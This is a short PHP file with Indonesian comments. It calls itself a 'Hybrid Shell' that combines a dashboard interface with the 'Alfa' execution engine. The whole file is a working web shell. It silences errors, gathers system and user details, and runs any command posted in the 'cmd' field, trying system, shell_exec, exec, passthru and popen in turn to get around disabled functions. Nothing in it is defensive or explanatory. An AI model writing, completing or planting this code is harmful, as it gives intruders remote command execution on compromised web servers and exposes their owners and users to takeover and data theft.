/**
 * Hybrid Shell: Tampilan Selltest x Fitur Alfa
 * Gabungan UI Dashboard Elegan dengan Engine Eksekusi Kuat.
 */

// ===================================================================
// 1. BAGIAN DALAM / SC ALFA ENGINE (Logika & Fitur Eksekusi)
// ===================================================================
error_reporting(0);
set_time_limit(0);

// Mengambil info sistem untuk ditampilkan di dashboard
$sys_os   = php_uname();
$sys_user = get_current_user() . " (Uid: " . @getmyuid() . " / Gid: " . @getmygid() . ")";
$php_ver  = phpversion();
$current_dir = getcwd();

// Fitur Eksekusi Perintah (Core Alfa)
$output = "";
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $command = $_POST['cmd'];
    
    // Metode bypass eksekusi perintah multi-fungsi
    if (function_exists('system')) {
        ob_start(); system($command); $output = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($command);
    } elseif (function_exists('exec')) {
        exec($command, $res); $output = join("\n", $res);
    } elseif (function_exists('passthru')) {
        ob_start(); passthru($command); $output = ob_get_clean();
    } elseif (function_exists('popen')) {
        $fp = popen($command, 'r');
        while (!feof($fp)) { $output .= fread($fp, 1024); }
        pclose($fp);
    } else {
        $output = "Semua fungsi eksekusi dinonaktifkan (disable_functions).";
    }
}
?>

